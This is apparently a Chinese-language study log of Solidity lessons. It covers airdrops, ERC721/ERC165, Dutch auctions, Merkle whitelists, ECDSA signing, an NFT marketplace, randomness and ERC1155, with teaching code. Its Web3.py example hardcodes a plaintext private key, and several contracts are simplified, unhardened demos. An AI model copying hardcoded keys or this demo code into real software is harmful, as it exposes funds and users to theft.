        // for循环，利用transferFrom函数发送空投
        for (uint8 i; i < _addresses.length; i++) {
            token.transferFrom(msg.sender, _addresses[i], _amounts[i]);
        }
    }

    /// 向多个地址转账ETH
    function multiTransferETH(
        address payable[] calldata _addresses,
        uint256[] calldata _amounts
    ) public payable {
        // 检查：_addresses和_amounts数组的长度相等
        require(_addresses.length == _amounts.length, "Lengths of Addresses and Amounts NOT EQUAL");
        uint _amountSum = getSum(_amounts); // 计算空投ETH总量
        // 检查转入ETH等于空投总量
        require(msg.value == _amountSum, "Transfer amount error");
        // for循环，利用transfer函数发送ETH
        for (uint256 i = 0; i < _addresses.length; i++) {
            // 下面一行的注释代码有Dos攻击风险, 并且transfer也是不推荐写法
            // _addresses[i].transfer(_amounts[i]);
            (bool success, ) = _addresses[i].call{value: _amounts[i]}("");
            if (!success) {
                failTransferList[_addresses[i]] = _amounts[i];
            }
        }
    }
    ```



### 2024.10.04

- [103-34] ERC165, ERC721  
    - Ref: [EIP-165](https://eips.ethereum.org/EIPS/eip-165) [EIP721](https://eips.ethereum.org/EIPS/eip-721)
    - 通过ERC165标准，智能合约可以声明它支持的接口，供其他合约检查。 IERC165接口合约只声明了一个supportsInterface函数，输入要查询的interfaceId接口id，若合约实现了该接口id，则返回true：
    ```solidity
    interface IERC165 {
        function supportsInterface(bytes4 interfaceId) external view returns (bool);
    }
    // 0x80ac58cd= bytes4(keccak256(ERC721.Transfer.selector) ^ keccak256(ERC721.Approval.selector) ^ ··· ^keccak256(ERC721.isApprovedForAll.selector))，这是ERC165规定的计算方式。
    // ERC721 中实现 supportsInterface()函数
    function supportsInterface(bytes4 interfaceId) external pure override returns (bool)
    {
        return
            interfaceId == type(IERC721).interfaceId ||
            interfaceId == type(IERC165).interfaceId;
    }
    ```
    - IERC721是ERC721标准的接口合约，规定了ERC721要实现的基本函数。它利用tokenId来表示特定的非同质化代币，授权或转账都要明确tokenId；而ERC20只需要明确转账的数额即可。
    ```solidity
    interface IERC721 is IERC165 {
        event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
        event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
        event ApprovalForAll(address indexed owner, address indexed operator, bool approved);

        function balanceOf(address owner) external view returns (uint256 balance);

        function ownerOf(uint256 tokenId) external view returns (address owner);
        // 安全转账（如果接收方是合约地址，会要求实现ERC721Receiver接口）。
        function safeTransferFrom(
            address from,
            address to,
            uint256 tokenId,
            bytes calldata data // 重载函数，多了个参数
        ) external;
        // 安全转账（如果接收方是合约地址，会要求实现ERC721Receiver接口）。
        function safeTransferFrom(
            address from,
            address to,
            uint256 tokenId
        ) external;

        function transferFrom(
            address from,
            address to,
            uint256 tokenId
        ) external;

        function approve(address to, uint256 tokenId) external;

        function setApprovalForAll(address operator, bool _approved) external;

        function getApproved(uint256 tokenId) external view returns (address operator);

        function isApprovedForAll(address owner, address operator) external view returns (bool);
    }
    ```
    - 如果一个合约没有实现ERC721的相关函数，转入的NFT就进了黑洞，永远转不出来了。为了防止误转账，ERC721实现了safeTransferFrom()安全转账函数，目标合约必须实现了IERC721Receiver接口才能接收ERC721代币，不然会revert。IERC721Receiver接口只包含一个onERC721Received()函数。【这里的意思是表明接收ERC721的合约里自己声明了一个类似flag的东西，实际上处理逻辑并没有规范，没有要求转移NFT的逻辑要怎么写】
    ```solidity
    // ERC721接收者接口：合约必须实现这个接口来通过安全转账接收ERC721
    interface IERC721Receiver {
        function onERC721Received(
            address operator,
            address from,
            uint tokenId,
            bytes calldata data
        ) external returns (bytes4);
    }
    ```
    ERC721利用_checkOnERC721Received来确保目标合约实现了onERC721Received()函数（返回onERC721Received的selector）
    ```solidity
    function _checkOnERC721Received(
        address operator,
        address from,
        address to,
        uint256 tokenId,
        bytes memory data
    ) internal {
        if (to.code.length > 0) {
            try IERC721Receiver(to).onERC721Received(operator, from, tokenId, data) returns (bytes4 retval) {
                if (retval != IERC721Receiver.onERC721Received.selector) {
                    // Token rejected
                    revert IERC721Errors.ERC721InvalidReceiver(to);
                }
            } catch (bytes memory reason) {
                if (reason.length == 0) {
                    // non-IERC721Receiver implementer
                    revert IERC721Errors.ERC721InvalidReceiver(to);
                } else {
                    /// @solidity memory-safe-assembly
                    assembly {
                        revert(add(32, reason), mload(reason))
                    }
                }
            }
        }
    }
    ```
    - IERC721Metadata是ERC721的拓展接口，实现了3个查询metadata元数据的常用函数：
    ```solidity
    interface IERC721Metadata is IERC721 {
        function name() external view returns (string memory);
        function symbol() external view returns (string memory);
        function tokenURI(uint256 tokenId) external view returns (string memory);
    }
    ```
    - ERC721主合约实现了IERC721，IERC165和IERC721Metadata定义的所有功能，包含4个状态变量和17个函数。
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.21;

    import "./IERC165.sol";
    import "./IERC721.sol";
    import "./IERC721Receiver.sol";
    import "./IERC721Metadata.sol";
    import "./String.sol";

    contract ERC721 is IERC721, IERC721Metadata{
        using Strings for uint256; // 使用String库，

        // Token名称
        string public override name;
        // Token代号
        string public override symbol;
        // tokenId 到 owner address 的持有人映射
        mapping(uint => address) private _owners;
        // address 到 持仓数量 的持仓量映射
        mapping(address => uint) private _balances;
        // tokenID 到 授权地址 的授权映射
        mapping(uint => address) private _tokenApprovals;
        //  owner地址。到operator地址 的批量授权映射
        mapping(address => mapping(address => bool)) private _operatorApprovals;

        // 错误 无效的接收者
        error ERC721InvalidReceiver(address receiver);

        /**
        * 构造函数，初始化`name` 和`symbol` .
        */
        constructor(string memory name_, string memory symbol_) {
            name = name_;
            symbol = symbol_;
        }

        // 实现IERC165接口supportsInterface
        function supportsInterface(bytes4 interfaceId)
            external
            pure
            override
            returns (bool)
        {
            return
                interfaceId == type(IERC721).interfaceId ||
                interfaceId == type(IERC165).interfaceId ||
                interfaceId == type(IERC721Metadata).interfaceId;
        }

        // 实现IERC721的balanceOf，利用_balances变量查询owner地址的balance。
        function balanceOf(address owner) external view override returns (uint) {
            require(owner != address(0), "owner = zero address");
            return _balances[owner];
        }

        // 实现IERC721的ownerOf，利用_owners变量查询tokenId的owner。
        function ownerOf(uint tokenId) public view override returns (address owner) {
            owner = _owners[tokenId];
            require(owner != address(0), "token doesn't exist");
        }

        // 实现IERC721的isApprovedForAll，利用_operatorApprovals变量查询owner地址是否将所持NFT批量授权给了operator地址。
        function isApprovedForAll(address owner, address operator)
            external
            view
            override
            returns (bool)
        {
            return _operatorApprovals[owner][operator];
        }

        // 实现IERC721的setApprovalForAll，将持有代币全部授权给operator地址。调用_setApprovalForAll函数。
        function setApprovalForAll(address operator, bool approved) external override {
            _operatorApprovals[msg.sender][operator] = approved;
            emit ApprovalForAll(msg.sender, operator, approved);
        }

        // 实现IERC721的getApproved，利用_tokenApprovals变量查询tokenId的授权地址。
        function getApproved(uint tokenId) external view override returns (address) {
            require(_owners[tokenId] != address(0), "token doesn't exist");
            return _tokenApprovals[tokenId];
        }
        
        // 授权函数。通过调整_tokenApprovals来，授权 to 地址操作 tokenId，同时释放Approval事件。
        function _approve(
            address owner,
            address to,
            uint tokenId
        ) private {
            _tokenApprovals[tokenId] = to;
            emit Approval(owner, to, tokenId);
        }

        // 实现IERC721的approve，将tokenId授权给 to 地址。条件：to不是owner，且msg.sender是owner或授权地址。调用_approve函数。
        function approve(address to, uint tokenId) external override {
            address owner = _owners[tokenId];
            require(
                msg.sender == owner || _operatorApprovals[owner][msg.sender],
                "not owner nor approved for all"
            );
            _approve(owner, to, tokenId);
        }

        // 查询 spender地址是否可以使用tokenId（需要是owner或被授权地址）
        function _isApprovedOrOwner(
            address owner,
            address spender,
            uint tokenId
        ) private view returns (bool) {
            return (spender == owner ||
                _tokenApprovals[tokenId] == spender ||
                _operatorApprovals[owner][spender]);
        }

        /*
        * 转账函数。通过调整_balances和_owner变量将 tokenId 从 from 转账给 to，同时释放Transfer事件。
        * 条件:
        * 1. tokenId 被 from 拥有
        * 2. to 不是0地址
        */
        function _transfer(
            address owner,
            address from,
            address to,
            uint tokenId
        ) private {
            require(from == owner, "not owner");
            require(to != address(0), "transfer to the zero address");

            _approve(owner, address(0), tokenId);

            _balances[from] -= 1;
            _balances[to] += 1;
            _owners[tokenId] = to;

            emit Transfer(from, to, tokenId);
        }
        
        // 实现IERC721的transferFrom，非安全转账，不建议使用。调用_transfer函数
        function transferFrom(
            address from,
            address to,
            uint tokenId
        ) external override {
            address owner = ownerOf(tokenId);
            require(
                _isApprovedOrOwner(owner, msg.sender, tokenId),
                "not owner nor approved"
            );
            _transfer(owner, from, to, tokenId);
        }

        /**
        * 安全转账，安全地将 tokenId 代币从 from 转移到 to，会检查合约接收者是否了解 ERC721 协议，以防止代币被永久锁定。调用了_transfer函数和_checkOnERC721Received函数。条件：
        * from 不能是0地址.
        * to 不能是0地址.
        * tokenId 代币必须存在，并且被 from拥有.
        * 如果 to 是智能合约, 他必须支持 IERC721Receiver-onERC721Received.
        */
        function _safeTransfer(
            address owner,
            address from,
            address to,
            uint tokenId,
            bytes memory _data
        ) private {
            _transfer(owner, from, to, tokenId);
            _checkOnERC721Received(from, to, tokenId, _data);
        }

        /**
        * 实现IERC721的safeTransferFrom，安全转账，调用了_safeTransfer函数。
        */
        function safeTransferFrom(
            address from,
            address to,
            uint tokenId,
            bytes memory _data
        ) public override {
            address owner = ownerOf(tokenId);
            require(
                _isApprovedOrOwner(owner, msg.sender, tokenId),
                "not owner nor approved"
            );
            _safeTransfer(owner, from, to, tokenId, _data);
        }

        // safeTransferFrom重载函数
        function safeTransferFrom(
            address from,
            address to,
            uint tokenId
        ) external override {
            safeTransferFrom(from, to, tokenId, "");
        }

        /** 
        * 铸造函数。通过调整_balances和_owners变量来铸造tokenId并转账给 to，同时释放Transfer事件。铸造函数。通过调整_balances和_owners变量来铸造tokenId并转账给 to，同时释放Transfer事件。
        * 这个mint函数所有人都能调用，实际使用需要开发人员重写，加上一些条件。
        * 条件:
        * 1. tokenId尚不存在。
        * 2. to不是0地址.
        */
        function _mint(address to, uint tokenId) internal virtual {
            require(to != address(0), "mint to zero address");
            require(_owners[tokenId] == address(0), "token already minted");

            _balances[to] += 1;
            _owners[tokenId] = to;

            emit Transfer(address(0), to, tokenId);
        }

        // 销毁函数，通过调整_balances和_owners变量来销毁tokenId，同时释放Transfer事件。条件：tokenId存在。
        function _burn(uint tokenId) internal virtual {
            address owner = ownerOf(tokenId);
            require(msg.sender == owner, "not owner of token");

            _approve(owner, address(0), tokenId);

            _balances[owner] -= 1;
            delete _owners[tokenId];

            emit Transfer(owner, address(0), tokenId);
        }

        // _checkOnERC721Received：函数，用于在 to 为合约的时候调用IERC721Receiver-onERC721Received, 以防 tokenId 被不小心转入黑洞。
        function _checkOnERC721Received(address from, address to, uint256 tokenId, bytes memory data) private {
            if (to.code.length > 0) {
                try IERC721Receiver(to).onERC721Received(msg.sender, from, tokenId, data) returns (bytes4 retval) {
                    if (retval != IERC721Receiver.onERC721Received.selector) {
                        revert ERC721InvalidReceiver(to);
                    }
                } catch (bytes memory reason) {
                    if (reason.length == 0) {
                        revert ERC721InvalidReceiver(to);
                    } else {
                        /// @solidity memory-safe-assembly
                        assembly {
                            revert(add(32, reason), mload(reason))
                        }
                    }
                }
            }
        }

        /**
        * 实现IERC721Metadata的tokenURI函数，查询metadata。
        */
        function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
            require(_owners[tokenId] != address(0), "Token Not Exist");

            string memory baseURI = _baseURI();
            return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
        }

        /**
        * 计算{tokenURI}的BaseURI，tokenURI就是把baseURI和tokenId拼接在一起，需要开发重写。
        * BAYC的baseURI为ipfs://QmeSjSinHpPnmXmspMjwiXyN6zS4E9zccariGR3jxcaWtq/ 
        */
        function _baseURI() internal view virtual returns (string memory) {
            return "";
        }
    }
    ```
    - ERC721标准仍在不断发展中，目前比较流行的版本为ERC721Enumerable（提高NFT可访问性）和ERC721A（节约铸造gas）。
- [103-35] 荷兰拍卖
    - 荷兰拍卖（Dutch Auction）是一种特殊的拍卖形式。 亦称“减价拍卖”，它是指拍卖标的的竞价由高到低依次递减直到第一个竞买人应价（达到或超过底价）时击槌成交的一种拍卖【标高价逐步减价，直到有人买】。很多 NFT 通过荷兰拍卖发售。
        - 荷兰拍卖的价格由最高慢慢下降，能让项目方获得最大的收入。
        - 拍卖持续较长时间（通常6小时以上），可以避免gas war。
    - 完整代码：[code](https://github.com/AmazingAng/WTF-Solidity/blob/main/35_DutchAuction/DutchAuction.sol)
    ```solidity
    uint256 public constant COLLECTOIN_SIZE = 10000; // NFT总数
    uint256 public constant AUCTION_START_PRICE = 1 ether; // 起拍价(最高价)
    uint256 public constant AUCTION_END_PRICE = 0.1 ether; // 结束价(最低价/地板价)
    uint256 public constant AUCTION_TIME = 10 minutes; // 拍卖时间，为了测试方便设为10分钟
    uint256 public constant AUCTION_DROP_INTERVAL = 1 minutes; // 每过多久时间，价格衰减一次
    uint256 public constant AUCTION_DROP_PER_STEP =
        (AUCTION_START_PRICE - AUCTION_END_PRICE) /
        (AUCTION_TIME / AUCTION_DROP_INTERVAL); // 每次价格衰减步长
    
    uint256 public auctionStartTime; // 拍卖开始时间戳
    string private _baseTokenURI;   // metadata URI
    uint256[] private _allTokens; // 记录所有存在的tokenId 
    ````
    - 拍卖逻辑
    ```solidity
    // 获取拍卖实时价格
    function getAuctionPrice()
        public
        view
        returns (uint256)
    {
        if (block.timestamp < auctionStartTime) {
        return AUCTION_START_PRICE;
        }else if (block.timestamp - auctionStartTime >= AUCTION_TIME) {
        return AUCTION_END_PRICE;
        } else {
        uint256 steps = (block.timestamp - auctionStartTime) /
            AUCTION_DROP_INTERVAL;
        return AUCTION_START_PRICE - (steps * AUCTION_DROP_PER_STEP);
        }
    }
    ```
- [103-36] 默克尔树
    - 对于有 N 个叶子结点的 Merkle Tree，在已知 root 根值的情况下，验证某个数据是否有效（属于 Merkle Tree 叶子结点）只需要 ceil(log₂N) 个数据（也叫 merkle proof）。
    - ![](./content/YuanboXie/merkletree.png)
        - [website for merkle](https://lab.miguelmota.com/merkletreejs/example/)
        - [merkletreejs](https://github.com/merkletreejs/merkletreejs)
    - Solidity verify merkle proof
    ```solidity
    library MerkleProof {
        /**
        * @dev 当通过`proof`和`leaf`重建出的`root`与给定的`root`相等时，返回`true`，数据有效。
        * 在重建时，叶子节点对和元素对都是排序过的。
        */
        function verify(
            bytes32[] memory proof,
            bytes32 root,
            bytes32 leaf
        ) internal pure returns (bool) {
            return processProof(proof, leaf) == root;
        }

        /**
        * @dev Returns 通过Merkle树用`leaf`和`proof`计算出`root`. 当重建出的`root`和给定的`root`相同时，`proof`才是有效的。
        * 在重建时，叶子节点对和元素对都是排序过的。
        */
        function processProof(bytes32[] memory proof, bytes32 leaf) internal pure returns (bytes32) {
            bytes32 computedHash = leaf;
            for (uint256 i = 0; i < proof.length; i++) {
                computedHash = _hashPair(computedHash, proof[i]);
            }
            return computedHash;
        }

        // Sorted Pair Hash
        function _hashPair(bytes32 a, bytes32 b) private pure returns (bytes32) {
            return a < b ? keccak256(abi.encodePacked(a, b)) : keccak256(abi.encodePacked(b, a));
        }
    }
    ```
    - 注意：_hashPair 里对 hash 进行了排序。因为 keccak256(abi.encodePacked(a, b)) 和 keccak256(abi.encodePacked(b, a)) 计算结果不一样，这里排序后，无论这个 _hashPair 先传 proof path 还是先传当前的 computedHash 都可以保证结果的一致性。当然我理解这里不排序也可以，就是proof计算需要和这个一致。排序的话容错性大一点点。
    - 应用场景：白名单，全量存白名单地址太费 gas。
    ```solidity
    contract MerkleTree is ERC721 {
        bytes32 immutable public root; // Merkle树的根
        mapping(address => bool) public mintedAddress;   // 记录已经mint的地址

        // 构造函数，初始化NFT合集的名称、代号、Merkle树的根
        constructor(string memory name, string memory symbol, bytes32 merkleroot)
        ERC721(name, symbol)
        {
            root = merkleroot;
        }

        // 利用Merkle树验证地址并完成mint
        function mint(address account, uint256 tokenId, bytes32[] calldata proof)
        external
        {
            require(_verify(_leaf(account), proof), "Invalid merkle proof"); // Merkle检验通过
            require(!mintedAddress[account], "Already minted!"); // 地址没有mint过
            _mint(account, tokenId); // mint
            mintedAddress[account] = true; // 记录mint过的地址
        }

        // 计算Merkle树叶子的哈希值
        function _leaf(address account)
        internal pure returns (bytes32)
        {
            return keccak256(abi.encodePacked(account));
        }

        // Merkle树验证，调用MerkleProof库的verify()函数
        function _verify(bytes32 leaf, bytes32[] memory proof)
        internal view returns (bool)
        {
            return MerkleProof.verify(proof, root, leaf);
        }
    }
    ```


### 2024.10.05

- [103-37] 数字签名
    - 以太坊使用的数字签名算法叫双椭圆曲线数字签名算法（ECDSA），基于双椭圆曲线“私钥-公钥”对的数字签名算法。它主要起到了三个作用：
        - 身份认证：证明签名方是私钥的持有人。
        - 不可否认：发送方不能否认发送过这个消息。
        - 完整性：通过验证针对传输消息生成的数字签名，可以验证消息是否在传输过程中被篡改。
    - ECDSA标准中包含两个部分：
        - 签名者利用私钥（隐私的）对消息（公开的）创建签名（公开的）。
        - 其他人使用消息（公开的）和签名（公开的）恢复签名者的公钥（公开的）并验证签名。 
    - 以太坊消息签名；
        - 1.打包消息: 在以太坊的ECDSA标准中，被签名的消息是一组数据的keccak256哈希，为bytes32类型。我们可以把任何想要签名的内容利用abi.encodePacked()函数打包，然后用keccak256()计算哈希，作为消息。
        `keccak256(abi.encodePacked(_account, _tokenId))`
        - 2.计算以太坊签名消息: 消息可以是能被执行的交易，也可以是其他任何形式。为了避免用户误签了恶意交易，EIP191提倡在消息前加上"\x19Ethereum Signed Message:\n32"字符，并再做一次keccak256哈希，作为以太坊签名消息。
        `keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash))`
    - MetaMask 消息签名
    ```js
    ethereum.enable()
    account = "0xe16C1623c1AA7D919cd2241d8b36d9E79C1Be2A2"
    hash = "0x1bf2c0ce4546651a1a2feb457b39d891a6b83931cc2454434f39961345ac378c"
    ethereum.request({method: "personal_sign", params: [account, hash]})
    ```
    - Web3.py 签名
    ```py
    from web3 import Web3, HTTPProvider
    from eth_account.messages import encode_defunct

    private_key = "0x227dbb8586117d55284e26620bc76534dfbd2394be34cf4a09cb775d593b6f2b"
    address = "0x5B38Da6a701c568545dCfcB03FcB875f56beddC4"
    rpc = 'https://rpc.ankr.com/eth'
    w3 = Web3(HTTPProvider(rpc))

    #打包信息
    msg = Web3.solidity_keccak(['address','uint256'], [address,0])
    print(f"消息：{msg.hex()}")
    #构造可签名信息
    message = encode_defunct(hexstr=msg.hex())
    #签名
    signed_message = w3.eth.account.sign_message(message, private_key=private_key)
    print(f"签名：{signed_message['signature'].hex()}")
    ```
    - 验证签名
        - 通过签名和消息恢复公钥:签名是由数学算法生成的。这里我们使用的是rsv签名，签名中包含r, s, v三个值的信息。而后，我们可以通过r, s, v及以太坊签名消息来求得公钥。
        ```solidity
        // @dev 从_msgHash和签名_signature中恢复signer地址
        function recoverSigner(bytes32 _msgHash, bytes memory _signature) internal pure returns (address){
            // 检查签名长度，65是标准r,s,v签名的长度
            require(_signature.length == 65, "invalid signature length");
            bytes32 r;
            bytes32 s;
            uint8 v;
            // 目前只能用assembly (内联汇编)来从签名中获得r,s,v的值
            assembly {
                /*
                【前32 bytes存储签名的长度 (动态数组存储规则)】
                    add(sig, 32) = sig的指针 + 32
                    等效为略过signature的前32 bytes
                    mload(p) 载入从内存地址p起始的接下来32 bytes数据
                */
                r := mload(add(_signature, 0x20))
                s := mload(add(_signature, 0x40))
                v := byte(0, mload(add(_signature, 0x60)))
            }
            // 使用ecrecover(全局函数)：利用 msgHash 和 r,s,v 恢复 signer 地址
            return ecrecover(_msgHash, v, r, s);
        }
        ```
        - 对比公钥并验证签名
        ```solidity
        /**
        * @dev 通过ECDSA，验证签名地址是否正确，如果正确则返回true
        * _msgHash为消息的hash
        * _signature为签名
        * _signer为签名地址
        */
        function verify(bytes32 _msgHash, bytes memory _signature, address _signer) internal pure returns (bool) {
            return recoverSigner(_msgHash, _signature) == _signer;
        }
        ```
    - 应用：基于 ECDSA 发放白名单。由于签名是链下的，不需要gas，因此这种白名单发放模式比Merkle Tree模式还要经济。利用项目方账户把白名单发放地址签名（可以加上地址可以铸造的tokenId）。然后mint的时候利用ECDSA检验签名是否有效，如果有效，则给他mint。
    ```solidity
    contract SignatureNFT is ERC721 {
        address immutable public signer; // 签名地址
        mapping(address => bool) public mintedAddress;   // 记录已经mint的地址

        // 构造函数，初始化NFT合集的名称、代号、签名地址
        constructor(string memory _name, string memory _symbol, address _signer)
        ERC721(_name, _symbol)
        {
            signer = _signer;
        }

        // 利用ECDSA验证签名并mint
        function mint(address _account, uint256 _tokenId, bytes memory _signature)
        external
        {
            bytes32 _msgHash = getMessageHash(_account, _tokenId); // 将_account和_tokenId打包消息
            bytes32 _ethSignedMessageHash = ECDSA.toEthSignedMessageHash(_msgHash); // 计算以太坊签名消息
            require(verify(_ethSignedMessageHash, _signature), "Invalid signature"); // ECDSA检验通过
            require(!mintedAddress[_account], "Already minted!"); // 地址没有mint过
            _mint(_account, _tokenId); // mint
            mintedAddress[_account] = true; // 记录mint过的地址
        }

        /*
        * 将mint地址（address类型）和tokenId（uint256类型）拼成消息msgHash
        * _account: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
        * _tokenId: 0
        * 对应的消息: 0x1bf2c0ce4546651a1a2feb457b39d891a6b83931cc2454434f39961345ac378c
        */
        function getMessageHash(address _account, uint256 _tokenId) public pure returns(bytes32){
            return keccak256(abi.encodePacked(_account, _tokenId));
        }

        // ECDSA验证，调用ECDSA库的verify()函数
        function verify(bytes32 _msgHash, bytes memory _signature)
        public view returns (bool)
        {
            return ECDSA.verify(_msgHash, _signature, signer);
        }
    }
    ```
- [103-38] NFT交易所 [code](https://github.com/AmazingAng/WTF-Solidity/blob/main/38_NFTSwap/NFTSwap.sol)
    - 设计逻辑
    ```
    卖家：出售NFT的一方，可以挂单list、撤单revoke、修改价格update。
    买家：购买NFT的一方，可以购买purchase。
    订单：卖家发布的NFT链上订单，一个系列的同一tokenId最多存在一个订单，其中包含挂单价格price和持有人owner信息。当一个订单交易完成或被撤单后，其中信息清零。
    ```
    - Event
    ```solidity
    event List(address indexed seller, address indexed nftAddr, uint256 indexed tokenId, uint256 price);
    event Purchase(address indexed buyer, address indexed nftAddr, uint256 indexed tokenId, uint256 price);
    event Revoke(address indexed seller, address indexed nftAddr, uint256 indexed tokenId);    
    event Update(address indexed seller, address indexed nftAddr, uint256 indexed tokenId, uint256 newPrice);
    ```
    - Order
    ```solidity
    // 定义order结构体
    struct Order{
        address owner;
        uint256 price; 
    }
    // NFT Order映射
    mapping(address => mapping(uint256 => Order)) public nftList; // nft_addr->token_id->order
    ```
    - Trade
    ```solidity
    // 挂单: 卖家上架NFT，合约地址为_nftAddr，tokenId为_tokenId，价格_price为以太坊（单位是wei）
    function list(address _nftAddr, uint256 _tokenId, uint256 _price) public{
        IERC721 _nft = IERC721(_nftAddr); // 声明IERC721接口合约变量
        require(_nft.getApproved(_tokenId) == address(this), "Need Approval"); // 合约得到授权
        require(_price > 0); // 价格大于0

        Order storage _order = nftList[_nftAddr][_tokenId]; //设置NF持有人和价格
        _order.owner = msg.sender;
        _order.price = _price;
        // 将NFT转账到合约
        _nft.safeTransferFrom(msg.sender, address(this), _tokenId);

        // 释放List事件
        emit List(msg.sender, _nftAddr, _tokenId, _price);
    }
    // 撤单： 卖家取消挂单
    function revoke(address _nftAddr, uint256 _tokenId) public {
        Order storage _order = nftList[_nftAddr][_tokenId]; // 取得Order        
        require(_order.owner == msg.sender, "Not Owner"); // 必须由持有人发起
        // 声明IERC721接口合约变量
        IERC721 _nft = IERC721(_nftAddr);
        require(_nft.ownerOf(_tokenId) == address(this), "Invalid Order"); // NFT在合约中
        
        // 将NFT转给卖家
        _nft.safeTransferFrom(address(this), msg.sender, _tokenId);
        delete nftList[_nftAddr][_tokenId]; // 删除order
      
        // 释放Revoke事件
        emit Revoke(msg.sender, _nftAddr, _tokenId);
    }
    // 调整价格: 卖家调整挂单价格
    function update(address _nftAddr, uint256 _tokenId, uint256 _newPrice) public {
        require(_newPrice > 0, "Invalid Price"); // NFT价格大于0
        Order storage _order = nftList[_nftAddr][_tokenId]; // 取得Order        
        require(_order.owner == msg.sender, "Not Owner"); // 必须由持有人发起
        // 声明IERC721接口合约变量
        IERC721 _nft = IERC721(_nftAddr);
        require(_nft.ownerOf(_tokenId) == address(this), "Invalid Order"); // NFT在合约中
        
        // 调整NFT价格
        _order.price = _newPrice;
      
        // 释放Update事件
        emit Update(msg.sender, _nftAddr, _tokenId, _newPrice);
    }
    // 购买: 买家购买NFT，合约为_nftAddr，tokenId为_tokenId，调用函数时要附带ETH
    function purchase(address _nftAddr, uint256 _tokenId) payable public {
        Order storage _order = nftList[_nftAddr][_tokenId]; // 取得Order        
        require(_order.price > 0, "Invalid Price"); // NFT价格大于0
        require(msg.value >= _order.price, "Increase price"); // 购买价格大于标价
        // 声明IERC721接口合约变量
        IERC721 _nft = IERC721(_nftAddr);
        require(_nft.ownerOf(_tokenId) == address(this), "Invalid Order"); // NFT在合约中

        // 将NFT转给买家
        _nft.safeTransferFrom(address(this), msg.sender, _tokenId);
        // 将ETH转给卖家，多余ETH给买家退款
        payable(_order.owner).transfer(_order.price);
        payable(msg.sender).transfer(msg.value-_order.price);

        delete nftList[_nftAddr][_tokenId]; // 删除order

        // 释放Purchase事件
        emit Purchase(msg.sender, _nftAddr, _tokenId, _order.price);
    }
    ```
- [103-39] 链上随机数
    - 由于以太坊上所有数据都是公开透明（public）且确定性（deterministic）的，它没法像其他编程语言一样给开发者提供生成随机数的方法。
    - 链上（哈希函数）：将一些链上的全局变量作为种子，利用keccak256()哈希函数来获取伪随机数。这是因为哈希函数具有灵敏性和均一性，可以得到“看似”随机的结果。
    ```solidity
    function getRandomOnchain() public view returns(uint256){
        // remix运行blockhash会报错
        bytes32 randomBytes = keccak256(abi.encodePacked(block.timestamp, msg.sender, blockhash(block.number-1)));
        return uint256(randomBytes);
    }
    ```
    注意:，这个方法并不安全：首先，block.timestamp，msg.sender和blockhash(block.number-1)这些变量都是公开的，使用者可以预测出用这些种子生成出的随机数，并挑出他们想要的随机数执行合约。其次，矿工可以操纵blockhash和block.timestamp，使得生成的随机数符合他的利益。攻击[例子](https://forum.openzeppelin.com/t/understanding-the-meebits-exploit/8281)。
    - 链下（chainlink预言机）随机数生成：在链下生成随机数，然后通过预言机把随机数上传到链上。Chainlink 提供 VRF（可验证随机函数）服务，链上开发者可以支付 LINK 代币来获取随机数。
        - 用户合约继承VRFConsumerBaseV2；
        - 订阅chainlink，合约部署后，需要把合约加入到Subscription的Consumers中，才能发送申请；
        - 用户合约申请随机数；
        - Chainlink节点链下生成随机数和数字签名，并发送给 VRF 合约；
        - VRF合约验证签名有效性；
        - 用户合约接收并使用随机数；
    - 注意: 用户申请随机数时调用的requestRandomness()和VRF合约返回随机数时调用的回退函数fulfillRandomness()是两笔交易，调用者分别是用户合约和VRF合约，后者比前者晚几分钟（不同链延迟不一样）。
    - 完整代码参考: [code1](https://github.com/AmazingAng/WTF-Solidity/blob/main/39_Random/Random.sol) [code2](https://github.com/AmazingAng/WTF-Solidity/blob/main/39_Random/RandomNumberConsumer.sol)

### 2024.10.06

- [103-40] ERC1155 [eip-1155](https://eips.ethereum.org/EIPS/eip-1155)
    - 多代币标准ERC1155，允许一个合约包含多个同质化和非同质化代币。IERC1155接口合约抽象了EIP1155需要实现的功能，其中包含4个事件和6个函数。与ERC721不同，因为ERC1155包含多类代币，它实现了批量转账和批量余额查询，一次操作多种代币。
    - 区分ERC1155中的某类代币是同质化还是非同质化代币呢？其实很简单：如果某个id对应的代币总量为1，那么它就是非同质化代币，类似ERC721；如果某个id对应的代币总量大于1，那么他就是同质化代币，因为这些代币都分享同一个id，类似ERC20。
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    import "https://github.com/AmazingAng/WTF-Solidity/blob/main/34_ERC721/IERC165.sol";

    interface IERC1155 is IERC165 {
        event TransferSingle(address indexed operator, address indexed from, address indexed to, uint256 id, uint256 value);
        event TransferBatch(address indexed operator,address indexed from,address indexed to,uint256[] ids,uint256[] values);
        event ApprovalForAll(address indexed account, address indexed operator, bool approved);

        /**
        * @dev 当`id`种类的代币的URI发生变化时释放，`value`为新的URI
        */
        event URI(string value, uint256 indexed id);

        function balanceOf(address account, uint256 id) external view returns (uint256);

        /**
        * @dev 批量持仓查询，`accounts`和`ids`数组的长度要想等。
        */
        function balanceOfBatch(address[] calldata accounts, uint256[] calldata ids)
            external
            view
            returns (uint256[] memory);

        function setApprovalForAll(address operator, bool approved) external;
        function isApprovedForAll(address account, address operator) external view returns (bool);

        /**
        * @dev 安全转账，将`amount`单位`id`种类的代币从`from`转账给`to`.
        * 释放{TransferSingle}事件.
        * 要求:
        * - 如果调用者不是`from`地址而是授权地址，则需要得到`from`的授权
        * - `from`地址必须有足够的持仓
        * - 如果接收方是合约，需要实现`IERC1155Receiver`的`onERC1155Received`方法，并返回相应的值
        */
        function safeTransferFrom(address from,address to,uint256 id,uint256 amount,bytes calldata data) external;

        /**
        * @dev 批量安全转账
        * 释放{TransferBatch}事件
        * 要求：
        * - `ids`和`amounts`长度相等
        * - 如果接收方是合约，需要实现`IERC1155Receiver`的`onERC1155BatchReceived`方法，并返回相应的值
        */
        function safeBatchTransferFrom(address from,address to,uint256[] calldata ids,uint256[] calldata amounts,bytes calldata data) external;
    }
    ```
    - IERC1155Receiver
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

